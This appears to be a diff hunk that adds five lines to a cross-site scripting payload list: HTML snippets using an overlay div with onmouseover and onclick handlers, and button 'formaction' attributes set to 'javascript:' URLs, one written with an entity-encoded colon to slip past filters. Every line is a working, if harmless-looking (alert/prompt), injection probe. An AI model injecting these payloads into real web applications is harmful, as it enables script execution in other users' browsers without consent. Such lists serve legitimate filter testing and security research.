@@ -1,0 +1,5 @@
+<div style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
+<form><button formaction=javascript&colon;alert(1)>CLICKME
+<form><button formaction="javascript:alert(XSS)">lol
+<form id="test" /><button form="test" formaction="javascript:alert(123)">TESTHTML5FORMACTION
+<form><button formaction="javascript:alert(123)">crosssitespt
